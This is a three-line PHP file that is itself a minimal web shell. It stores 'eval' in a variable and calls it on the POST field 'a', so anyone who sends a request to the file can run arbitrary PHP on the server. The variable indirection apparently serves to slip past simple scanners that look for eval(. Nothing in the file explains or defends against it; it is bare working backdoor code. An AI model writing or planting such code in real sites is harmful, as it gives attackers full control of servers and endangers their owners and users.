<?php 
$a = "eval";
$a(@$_POST['a']); 

